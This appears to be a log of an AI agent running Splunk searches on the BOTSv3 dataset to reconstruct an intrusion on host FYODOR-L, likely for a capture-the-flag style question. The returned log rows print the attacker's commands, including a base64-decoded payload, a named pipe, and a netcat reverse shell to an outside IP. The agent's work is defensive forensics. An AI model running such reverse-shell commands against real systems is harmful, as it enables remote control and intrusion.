gwMFx4MDBceDAwXHgwMCIKCQkiXHhiZlx4YTJceDAwXHgwMFx4MDBceDAwXHgwMFx4MDAiCgkJIlx4MDdceDAyXHgwMFx4MDBceGZ\u2026[6340 more chars cut]", "count": "1"}, {"_time": "2018-08-20T19:09:48.000+08:00", "Image": "C:\\Windows\\Temp\\unziped\\lsof-master\\iexeplorer.exe", "CommandLine": "\"C:\\windows\\temp\\unziped\\lsof-master\\iexeplorer.exe\" http://192.168.9.30:8080/frothlyinventory/showcase.action \"echo /9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSgBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKP/AABEIALABLAMBEQACEQEDEQH/xAGiAAABBQEBAQEBAQAAAAAAAAAAAQIDBAUGBwgJCgsQAAIBAwMCBAMFBQQEAAABfQECAwAEEQUSITFBBhNRYQcicRQygZGhCCNCscEVUtHwJDNicoIJChYXGBkaJSYnKCkqNDU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6g4SFhoeIiYqSk5SVlpeYmZqio6Slpqeoqaqys7S1tre4ubrCw8TFxsfIycrS09TV1tfY2drh4uPk5ebn6Onq8fLz9PX29/j5+gEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoLEQACAQIEBAMEBwUEBAABAncAAQIDEQQFITEGEkFRB2FxEyIygQgUQpGhscEJIzNS8BVictEKFiQ04SXxFxgZGiYnKCkqNTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqCg4SFhoeIiYqSk5SVlpeYmZqio6Slpqeoqaqys7S1tre4ubrCw8TFxsfIycrS09TV1tfY2dri4+Tl5ufo6ery8/T19vf4+fr/2gAMAwEAAhEDEQA/APqmgAoAKACgAoAKACgAoAKACgAoAKACgAzQAUAFABQAUAFABQAUAFABQAUAFABQAUAFABQAUAFABQAUAFABQBxHxfjaTwltV0T/AEhCWc44wazqq6NKTszwtYp4XDGdGDD5cP26Vzs6k77HjPxgjK6jA5cndNOMFcYwV9+a1o9TCs9j9Ea3MAoAKACgAoAKACgAoAKACgAoAKAPJf2hdX8NaTpWkP4s0u41GCSZxEsMhQowUZPDL2pNN7AeKL4p+EM3Xw7qcX1uJP6S0rSHdFhdf+EUIDrpV65HOz7VcZ/9Cx+tFpBdDX+L3hPTcJonhC3dBwBOih/rvO40uVhc7jxf46j8F+EPB2oXelWuox61ZCfysBDFhI26kHd/rPQdKOQOY48/HHRG/wCZWtAT28tP50cj7hcQ/HPSEAMXhqAH0CL/AI0cj7hc3fA3xeg8T+KtN0SHQIbZryTyxMWGF4Jzjb7etHK+4XJPEnxoPgvxJqegTaJHfSWdw6/aBJt3AncBjacYDY69qfK+4XKH/DTDpxF4aXP/AF84/wDZKOULnU6P8a72/tFmmsrK2Yg\u2026[6692 more chars cut]", "count": "1"}, {"_time": "2018-08-20T19:10:13.000+08:00", "Image": "C:\\Windows\\Temp\\unziped\\lsof-master\\iexeplorer.exe", "CommandLine": "\"C:\\windows\\temp\\unziped\\lsof-master\\iexeplorer.exe\" http://192.168.9.30:8080/frothlyinventory/showcase.action \"ls -lf /tmp\"", "count": "1"}, {"_time": "2018-08-20T19:10:55.000+08:00", "Image": "C:\\Windows\\Temp\\unziped\\lsof-master\\iexeplorer.exe", "CommandLine": "\"C:\\windows\\temp\\unziped\\lsof-master\\iexeplorer.exe\" http://192.168.9.30:8080/frothlyinventory/showcase.action \"base64 --decode /tmp/colonel &gt; /tmp/colonel.c\"", "count": "1"}, {"_time": "2018-08-20T19:11:27.000+08:00", "Image": "C:\\Windows\\Temp\\unziped\\lsof-master\\iexeplorer.exe", "CommandLine": "\"C:\\windows\\temp\\unziped\\lsof-master\\iexeplorer.exe\" http://192.168.9.30:8080/frothlyinventory/showcase.action \"cat /tmp/colonel.c\"", "count": "1"}, {"_time": "2018-08-20T19:11:45.000+08:00", "Image": "C:\\Windows\\Temp\\unziped\\lsof-master\\iexeplorer.exe", "CommandLine": "\"C:\\windows\\temp\\unziped\\lsof-master\\iexeplorer.exe\" http://192.168.9.30:8080/frothlyinventory/showcase.action \"md5sum /tmp/colonel.c\"", "count": "1"}, {"_time": "2018-08-20T19:12:51.000+08:00", "Image": "C:\\Windows\\Temp\\unziped\\lsof-master\\iexeplorer.exe", "CommandLine": "\"C:\\windows\\temp\\unziped\\lsof-master\\iexeplorer.exe\" http://192.168.9.30:8080/frothlyinventory/showcase.action \"mknod /tmp/backpipe p\"", "count": "1"}, {"_time": "2018-08-20T19:13:56.000+08:00", "Image": "C:\\Windows\\Temp\\unziped\\lsof-master\\iexeplorer.exe", "CommandLine": "\"C:\\windows\\temp\\unziped\\lsof-master\\iexeplorer.exe\" http://192.168.9.30:8080/frothlyinventory/showcase.action \"/bin/sh 0&lt;/tmp/backpipe | nc 45.77.53.176 8088 1&gt;/tmp/backpipe\"", "count": "1"}], "meta": {"total_event_count": 24, "returned": 24, "sid": "1790258693.1425", "clipped": "values longer than 1500 chars are cut; extract what you need with rex/eval to read the rest"}}


[STATE:agent_in]  step=10  msgs=50  errors=0  empty=3  verified=True
  last_msg: ToolMessage -> '{"results": [{"_time": "2018-08-20T18:08:17.000+08:00", "Image": "C:\\\\Windows\\\\System32\\\\net.exe", "CommandLine": "\\"C:\\'
[Max iterations reached — forcing final answer]

[Agent thinking]
I have a complete, verified evidence chain. Submitting the finding.


[WORKER RESULT] Senior-1-Q316: I have a complete, verified evidence chain. Submitting the finding.

[STATE:agent_in]  step=0  msgs=55  errors=0  empty=0  verified=False
  last_msg: HumanMessage -> 'LOAD-BEARING PREMISES FILED BY OTHERS, still unsettled. The answer to this question rests on these, and whoever filed on'

[Agent thinking]
Both premises settle from complete results I already hold — the 1-of-1 retrieval row, the 1-of-1 port-3333 connection, and the 21-of-21 EventCode=11 set were all fully returned and read. No new queries are needed; I file the verdicts with word-for-word quotes.


[WORKER RESULT] Senior-1-Q316: Both premises settle from complete results I already hold — the 1-of-1 retrieval row, the 1-of-1 port-3333 connection, and the 21-of-21 EventCode=11 set were all fully returned and read. No new querie

[STATE:agent_in]  step=0  msgs=58  errors=0  empty=0  verified=False
  last_msg: HumanMessage -> 'LOAD-BEARING PREMISES FILED BY OTHERS, still unsettled. The answer to this question rests on these, and whoever filed on'

[Agent thinking]
Intention: Re-run the four decisive queries fresh this round so the literal output rows come from this round's results — the stream:http retrieval to 45.77.53.176, the EventCode=3 connection to port 3333, the EventCode=11 tool-file creations, and the logos.png retrieval row with its transfer fields.


[STATE:verify_in]  step=1  msgs=59  errors=0  empty=0  verified=False
  last_msg: AIMessage -> tool_call: run_splunk_search({"query":"index=botsv3 sourcetype=\"stream:http\" dest_ip=\"45.77.53.176\" | stats count, sum(bytes_out) as total_bytes_out by uri_path, src_ip, http_method, status"})
[Verify OK]     run_splunk_search

[STATE:execute_in]  step=1  msgs=59  errors=0  empty=0  verified=True
  last_msg: AIMessage -> tool_call: run_splunk_search({"query":"index=botsv3 sourcetype=\"stream:http\" dest_ip=\"45.77.53.176\" | stats count, sum(bytes_out) as total_bytes_out by uri_path, src_ip, http_method, status"})
[Execute] run_splunk_search({"query":"index=botsv3 sourcetype=\"stream:http\" dest_ip=\"45.77.53.176\" | stats count, sum(bytes_out) as total_bytes_out by uri_path, src_ip, http_method, status"})
          -> {"results": [{"uri_path": "/images/logos.png", "src_ip": "192.168.70.186", "http_method": "GET", "status": "200", "count": "1", "total_bytes_out": "5542140"}], "meta": {"total_event_count": 1, "returned": 1, "sid": "1790258793.1427"}}


[STATE:agent_in]  step=1  msgs=60  errors=0  empty=0  verified=True
  last_msg: ToolMessage -> '{"results": [{"uri_path": "/images/logos.png", "src_ip": "192.168.70.186", "http_method": "GET", "status": "200", "count'

[Agent thinking]
Intention: Re-run the EventCode=3 connection to 45.77.53.176:3333 to capture its literal row with ProcessGuid, and the EventCode=11 tool-file creations on FYODOR-L.


[STATE:verify_in]  step=2  msgs=61  errors=0  empty=0  verified=True
  last_msg: AIMessage -> tool_call: run_splunk_search({"query":"index=botsv3 sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" host=\"FYODOR-L\" EventCode=3 DestinationIp=\"45.77.53.176\" DestinationPort=3333 | stats count by _time, Image, ProcessGuid, SourceIp"})
[Verify OK]     run_splunk_search

[STATE:execute_in]  step=2  msgs=61  errors=0  empty=0  verified=True
  last_msg: AIMessage -> tool_call: run_splunk_search({"query":"index=botsv3 sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" host=\"FYODOR-L\" EventCode=3 DestinationIp=\"45.77.53.176\" DestinationPort=3333 | stats count by _time, Image, ProcessGuid, SourceIp"})
[Execute] run_splunk_search({"query":"index=botsv3 sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" host=\"FYODOR-L\" EventCode=3 DestinationIp=\"45.77.53.176\" DestinationPort=3333 | stats count by _time, Image, ProcessGuid, SourceIp"})
          -> {"results": [{"_time": "2018-08-20T18:47:06.000+08:00", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessGuid": "{EBF7A186-C442-5B58-0000-00109914D901}", "SourceIp": "192.168.70.186", "count": "1"}], "meta": {"total_event_count": 1, "returned": 1, "sid": "1790258799.1428"}}


[STATE:agent_in]  step=2  msgs=62  errors=0  empty=0  verified=True
  last_msg: ToolMessage -> '{"results": [{"_time": "2018-08-20T18:47:06.000+08:00", "Image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powers'

[Agent thinking]
Intention: Re-run the EventCode=11 file-creation query scoped to the three tool files, to quote their literal rows with ProcessGuid and timestamps.



[STATE:verify_in]  step=3  msgs=63  errors=0  empty=0  verified=True
  last_msg: AIMessage -> tool_call: run_splunk_search({"query":"index=botsv3 sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" host=\"FYODOR-L\" EventCode=11 (TargetFilename=\"C:\\\\Windows\\\\Temp\\\\hdoor.exe\" OR TargetFilename=\"C:\\\\Windows\\\\Temp\\\\unziped\\\\lsof-master\\\\iexepler.exe\" OR TargetFilename=\"C:\\\\Windows\\\\Temp\\\\unziped\\\\lsof-master\\\\powershell.exe\") | stats count by _time, Image, ProcessGuid, TargetFilename"})
[Verify OK]     run_splunk_search

[STATE:execute_in]  step=3  msgs=63  errors=0  empty=0  verified=True
  last_msg: AIMessage -> tool_call: run_splunk_search({"query":"index=botsv3 sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" host=\"FYODOR-L\" EventCode=11 (TargetFilename=\"C:\\\\Windows\\\\Temp\\\\hdoor.exe\" OR TargetFilename=\"C:\\\\Windows\\\\Temp\\\\unziped\\\\lsof-master\\\\iexepler.exe\" OR TargetFilename=\"C:\\\\Windows\\\\Temp\\\\unziped\\\\lsof-master\\\\powershell.exe\") | stats count by _time, Image, ProcessGuid, TargetFilename"})
[Execute] run_splunk_search({"query":"index=botsv3 sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" host=\"FYODOR-L\" EventCode=11 (TargetFilename=\"C:\\\\Windows\\\\Temp\\\\hdoor.exe\" OR TargetFilename=\"C:\\\\Windows\\\\Temp\\\\unziped\\\\lsof-master\\\\iexepler.exe\" OR TargetFilename=\"C:\\\\Windows\\\\Temp\\\\unziped\\\\lsof-master\\\\powershell.exe\") | stats count by _time, Image, ProcessGuid, TargetFilename"})
          -> {"results": [{"_time": "2018-08-20T18:42:49.000+08:00", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessGuid": "{EBF7A186-C442-5B58-0000-00109914D901}", "TargetFilename": "C:\\Windows\\Temp\\hdoor.exe", "count": "1"}, {"_time": "2018-08-20T18:47:41.000+08:00", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessGuid": "{EBF7A186-C442-5B58-0000-00109914D901}", "TargetFilename": "C:\\Windows\\Temp\\unziped\\lsof-master\\powershell.exe", "count": "1"}], "meta": {"total_event_count": 2, "returned": 2, "sid": "1790258805.1429"}}


[STATE:agent_in]  step=3  msgs=64  errors=0  empty=0  verified=True
  last_msg: ToolMessage -> '{"results": [{"_time": "2018-08-20T18:42:49.000+08:00", "Image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powers'

[Agent thinking]
Intention: The scoped OR query returned only 2 of the expected 3 tool-file rows — the iexepler.exe clause matched nothing, meaning the actual filename is spelled differently (likely "iexeplorer.exe"). Re-run with a trailing wildcard on the lsof-master directory to capture the exact literal filename and its full row.



[STATE:verify_in]  step=4  msgs=65  errors=0  empty=0  verified=True
  last_msg: AIMessage -> tool_call: run_splunk_search({"query":"index=botsv3 sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" host=\"FYODOR-L\" EventCode=11 TargetFilename=\"C:\\\\Windows\\\\Temp\\\\unziped\\\\lsof-master\\\\*\" | stats count by _time, Image, ProcessGuid, TargetFilename"})
[Verify OK]     run_splunk_search

[STATE:execute_in]  step=4  msgs=65  errors=0  empty=0  verified=True
  last_msg: AIMessage -> tool_call: run_splunk_search({"query":"index=botsv3 sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" host=\"FYODOR-L\" EventCode=11 TargetFilename=\"C:\\\\Windows\\\\Temp\\\\unziped\\\\lsof-master\\\\*\" | stats count by _time, Image, ProcessGuid, TargetFilename"})
[Execute] run_splunk_search({"query":"index=botsv3 sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" host=\"FYODOR-L\" EventCode=11 TargetFilename=\"C:\\\\Windows\\\\Temp\\\\unziped\\\\lsof-master\\\\*\" | stats count by _time, Image, ProcessGuid, TargetFilename"})
          -> {"results": [{"_time": "2018-08-20T18:47:41.000+08:00", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessGuid": "{EBF7A186-C442-5B58-0000-00109914D901}", "TargetFilename": "C:\\Windows\\Temp\\unziped\\lsof-master\\iexeplorer.exe", "count": "1"}, 